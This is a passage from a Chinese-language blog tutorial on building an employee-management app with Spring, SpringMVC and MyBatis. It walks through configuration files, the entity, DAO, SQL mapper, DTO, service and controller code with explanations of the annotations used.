class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/usermanage?serverTimezone=GMT&amp;useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false</span></span><br><span class="line"><span class="attr">jdbc.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="springmvc-xml"><a href="#springmvc-xml" class="headerlink" title="springmvc.xml"></a>springmvc.xml</h3><p>springmvc.xml文件下添加如下标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!--添加包扫描--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.hukaichao.controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该注解会自动注册RequsetMapperHandlerMapping和RequestMappingHandlerAdapter两个Bean,</span></span><br><span class="line"><span class="comment">是SpringMVC为@Controller分发请求所必须的，并提供了数据绑定支持、读写XML文件支持、读写JSON文件支持等功能--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--添加视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置前缀--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/views/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置后缀--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="log4j-properties"><a href="#log4j-properties" class="headerlink" title="log4j.properties"></a>log4j.properties</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### set log levels ###</span></span><br><span class="line"><span class="attr">log4j.rootLogger</span>=<span class="string">DEBUG,Console</span></span><br><span class="line"><span class="comment">#,File</span></span><br><span class="line"><span class="comment">###  Console  ###</span></span><br><span class="line"><span class="attr">log4j.appender.Console</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="attr">log4j.appender.Console.Target</span>=<span class="string">System.out</span></span><br><span class="line"><span class="attr">log4j.appender.Console.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="attr">log4j.appender.Console.layout.ConversionPattern</span>=<span class="string">%d&#123;ABSOLUTE&#125; %5p %c&#123;1&#125;:%L - %m%n</span></span><br><span class="line"><span class="comment">### File ###</span></span><br><span class="line"><span class="comment">#log4j.appender.File=org.apache.log4j.RollingFileAppender</span></span><br><span class="line"><span class="comment">#log4j.appender.File.File=$&#123;project&#125;/WEB-INF/logs/app.log</span></span><br><span class="line"><span class="comment">#log4j.appender.File.DatePattern=_yyyyMMdd&#x27;.log&#x27;</span></span><br><span class="line"><span class="comment">#log4j.appender.File.MaxFileSize=10MB</span></span><br><span class="line"><span class="comment">#log4j.appender.File.Threshold=ALL</span></span><br><span class="line"><span class="comment">#log4j.appender.File.layout=org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="comment">#log4j.appender.File.layout.ConversionPattern=[%p][%d&#123;yyyy-MM-dd HH\:mm\:</span></span><br></pre></td></tr></table></figure><h2 id="整合注解"><a href="#整合注解" class="headerlink" title="整合注解"></a>整合注解</h2><p>在Java目录下定义包结构，第一个包名一般采用公司域名的倒写，我这里就采用com.hukaichao了。<br>在这个包之后的结构一般分为controller包、dao包、dto包、model包、service包。<br>项目结构目录如下：<br><img src="/upload/2022/04/image-0e1a8be4f294461c9883059bdeb19dd8.png" alt="image.png"></p><h3 id="实体类User"><a href="#实体类User" class="headerlink" title="实体类User"></a>实体类User</h3><p>该类在model包下，也有的规范将该包命名为 POJO（Plain Ordinary Java Object）简单的Java对象<br>在其中定义User的属性，需要序列化该类，即实现Serializable接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主键</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">//工号</span></span><br><span class="line">    <span class="keyword">private</span> String no;</span><br><span class="line">    <span class="comment">//职位</span></span><br><span class="line">    <span class="keyword">private</span> String position;</span><br><span class="line">    <span class="comment">//离职原因</span></span><br><span class="line">    <span class="keyword">private</span> String reason;</span><br><span class="line">    <span class="comment">//状态，0：删除 1：在职  2：离职</span></span><br><span class="line">    <span class="keyword">private</span> String status;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//省略get和set方法</span></span><br></pre></td></tr></table></figure><h3 id="Dao接口"><a href="#Dao接口" class="headerlink" title="Dao接口"></a>Dao接口</h3><p>持久层，又叫数据访问层 DAO(Data Access Object)，是和数据库直接打交道的层。简单说就是把CRUD(增加、删除、修改、查询)、更新等操作封装成一个独立的层。用来与数据库打交道。夹在业务逻辑与数据库资源中间。</p><p>@Repository和@Controller、@Service、@Component的作用差不多，都是把对象交给spring管理。@Repository用在持久层的接口上，这个注解是将接口的一个实现类交给spring管理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(User user)</span>;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">findById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//@Param传递单个参数</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(<span class="meta">@Param(&quot;user&quot;)</span> User user)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">updateStatus</span><span class="params">(<span class="meta">@Param(&quot;user&quot;)</span> User user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UserMapper-xml"><a href="#UserMapper-xml" class="headerlink" title="UserMapper.xml"></a>UserMapper.xml</h3><p>根据dao层中定义方法编写sql映射文件</p><p>resultMap 可以将表中字段映射到 pojo对象的属性中<br>id是表的主键映射到pojo对象的主键属性<br>result是表的一个字段映射到pojo对象的一个属性</p><p>sql标签用来处理重复是SQL<br>引用时使用include标签 refid指定sql代码块的id</p><p>useGeneratedKeys&#x3D;“true”     keyProperty&#x3D;“id” 用于在插入数据时得到主键<br>useGeneratedKeys设置为 true 时，表示如果插入的表id以自增列为主键，则允许 JDBC 支持自动生成主键，并可将自动生成的主键id返回。<br>selectKey 标签用于返回主键 order&#x3D;before表示在insert执行之前执行，我的数据库中没有设置自增主键，所以这里在执行前获取最大id进行+1处理返回作为新的主键</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.hukaichao.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.hukaichao.model.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;no&quot;</span> <span class="attr">column</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;position&quot;</span> <span class="attr">column</span>=<span class="string">&quot;position&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;status&quot;</span> <span class="attr">column</span>=<span class="string">&quot;status&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;reason&quot;</span> <span class="attr">column</span>=<span class="string">&quot;reason&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- sql代码块 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;table_column&quot;</span>&gt;</span></span><br><span class="line">        id,</span><br><span class="line">        name,</span><br><span class="line">        no,</span><br><span class="line">        status,</span><br><span class="line">        position,</span><br><span class="line">        reason</span><br><span class="line">    <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">        select</span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;table_column&quot;</span>/&gt;</span></span><br><span class="line">        from user</span><br><span class="line">        where status != &#x27;0&#x27;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.model.User&quot;</span>&gt;</span></span><br><span class="line">        select</span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;table_column&quot;</span>/&gt;</span></span><br><span class="line">        from user</span><br><span class="line">        where id = #&#123;id&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;save&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">parameterType</span>=<span class="string">&quot;com.hukaichao.model.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">order</span>=<span class="string">&quot;BEFORE&quot;</span>&gt;</span></span><br><span class="line">            select max(id) + 1 as id from user</span><br><span class="line">        <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">        insert into user(id, name ,no, status, position)</span><br><span class="line">        value (#&#123;id&#125;,#&#123;name&#125;,#&#123;no&#125;,#&#123;status&#125;,#&#123;position&#125; )</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.hukaichao.model.User&quot;</span>&gt;</span></span><br><span class="line">        update user</span><br><span class="line">        <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">            name = #&#123;user.name&#125;,</span><br><span class="line">            no = #&#123;user.no&#125;,</span><br><span class="line">            status = #&#123;user.status&#125;,</span><br><span class="line">            position = #&#123;user.position&#125;,</span><br><span class="line">            reason = #&#123;user.reason&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">            id = #&#123;user.id&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;updateStatus&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.hukaichao.model.User&quot;</span>&gt;</span></span><br><span class="line">        update user</span><br><span class="line">        <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">            status = #&#123;user.status&#125;,</span><br><span class="line">            reason = #&#123;user.reason&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">            id = #&#123;user.id&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTO"><a href="#DTO" class="headerlink" title="DTO"></a>DTO</h3><p>DTO (Data Transfer Object)数据传输对象<br>主要用于远程调用等需要大量传输对象的地方。<br>比如我们一张表有100个字段，那么对应的PO就有100个属性。<br>但是我们界面上只要显示10个字段，<br>客户端用WEB service来获取数据，没有必要把整个PO对象传递到客户端，<br>这时我们就可以用只有这10个属性的DTO来传递结果到客户端，这样也不会暴露服务端表结构.到达客户端以后，如果用这个对象来对应界面显示，那此时它的身份就转为VO</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主键</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="comment">//工号</span></span><br><span class="line">    <span class="keyword">private</span> String no;</span><br><span class="line">    <span class="comment">//职位</span></span><br><span class="line">    <span class="keyword">private</span> String position;</span><br><span class="line">    <span class="comment">//离职原因</span></span><br><span class="line">    <span class="keyword">private</span> String reason;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//状态，0：删除 1：在职  2：离职</span></span><br><span class="line">    <span class="keyword">private</span> String status;</span><br></pre></td></tr></table></figure><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>service层：service层里面的方法相较于dao层中的方法进行了一层包装。被称为服务，肯定是相比之下比较高层次的一层结构，相当于将几种操作封装起来，至于为什么service层要使用接口来定义有以下几点好处：</p><ol><li>在java中接口是多继承的，而类是单继承的，如果你需要一个类实现多个service，你用接口可以实现，用类定义service就没那么灵活</li><li>要提供不同的数据库的服务时，我们只需要面对接口用不同的类实现即可，而不用重复地定义类</li><li>编程规范问题，接口化的编程为的就是将实现封装起来，然调用者只关心接口不关心实现，也就是“高内聚，低耦合”的思想。<br>service实现类：也顾名思义，service实现类实现了service接口，进行具体的业务操作。</li></ol><p>Service接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">save</span><span class="params">(UserDTO user)</span>;</span><br><span class="line"></span><br><span class="line">    User <span class="title function_">findById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">update</span><span class="params">(UserDTO user)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">updateStatus</span><span class="params">(UserDTO user)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Service接口实现类<br>在Service接口中不需要使用@Service注解，在其实现类中需要使用</p><p>@Autowired（这个注解属于Spring的）是根据类型自动装配，在IoC容器中找UserDao这个类并返回该属性，如果不存在这个类或者存在多个类都会抛出BeanCreationException异常。存在多个类可以使用@Qualifier配合@Autowired解决这个问题。@Qualifier指定优先的类名称<br>如果可能不存在这个类可以@Autowired(required&#x3D;true)处理</p><p>@Resource（这个注解属于J2EE的）是根据名称自动装配，找不到与名称匹配的bean时才按照类型进行装配。一般在开发中Autowired使用比较多，因为一般都是一个接口对应一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userDao.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">save</span><span class="params">(UserDTO user)</span> &#123;</span><br><span class="line">        user.setStatus(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        userDao.save(convert(user));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">update</span><span class="params">(UserDTO user)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">User</span> <span class="operator">=</span> convert(user);</span><br><span class="line">        userDao.update(User);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userDao.findById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">convert</span><span class="params">(UserDTO user)</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">User</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="keyword">if</span>(user.getId() != <span class="literal">null</span>)&#123;</span><br><span class="line">            User.setId(Integer.valueOf(user.getId()));</span><br><span class="line">        &#125;</span><br><span class="line">        User.setName(user.getName());</span><br><span class="line">        User.setNo(user.getNo());</span><br><span class="line">        User.setStatus(user.getStatus());</span><br><span class="line">        <span class="keyword">if</span>(user.getStatus().equals(<span class="string">&quot;在职&quot;</span>))&#123;</span><br><span class="line">            User.setStatus(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(user.getStatus().equals(<span class="string">&quot;已离职&quot;</span>))&#123;</span><br><span class="line">            User.setStatus(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        User.setPosition(user.getPosition());</span><br><span class="line">        User.setReason(user.getReason());</span><br><span class="line">        <span class="keyword">return</span> User;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">updateStatus</span><span class="params">(UserDTO user)</span> &#123;</span><br><span class="line">        userDao.updateStatus(convert(user));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><p>controller层为控制层，主要处理外部请求。调用service层，将service层返回的BO&#x2F;DO转化为DTO&#x2F;VO并封装成统一返回对象返回给调用方。如果返回数据用于前端模版渲染则返回VO，否则一般返回DTO。不论是DTO还是VO，一般都会对BO&#x2F;DO中的数据进行一些转化和整合，比如将gender属性中的0转化“男”，1转化为“女”等。</p><p>@RequestMapping注解用于指定URL映射，方法可以指定get、post、put、delete，对应的注解还有@GetMapping、PostMapping、PutMapping、DeleteMapping</p><p>@RequestParam 注解的作用：标注在接口的方法参数上，被标注的参数的值来源于request.getParameter或request.getParameterValues</p><p>@RequestBody主要用来接收前端传递给后端的json字符串中的数据的(请求体中的数据的)；而最常用的使用请求体传参的无疑是POST请求了，所以使用@RequestBody接收数据时，一般都用POST方式进行提交。<br>在后端的同一个接收方法里，@RequestBody与@RequestParam()可以同时使用，@RequestBody最多只能有一个，而@RequestParam()可以有多个。</p><p>Model是一个接口，它的实现类为ExtendedModelMap，继承ModelMap类，spring会自动为Model创建实例，并作为controller的入参<br>model.addattribute(K,V)往前台传数据,类似于request.setAttribute(K,V)<br>request.setAttribute()<br>属于页面之间的传值，从a.jsp到b.jsp一次传递，之后这个request就会失去他的作用范围，再传就要重新设一个request.setAttribute()。（使用session.setAttribute()会在一个过程中始终保持这个值）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/User&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> com.hukaichao.service.UserService UserService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/findAll&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findAll</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        List&lt;User&gt; users = UserService.findAll();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;users&quot;</span>, convertToList(users));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userManage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/in&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">userIn</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userIn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">userOut</span><span class="params">(<span 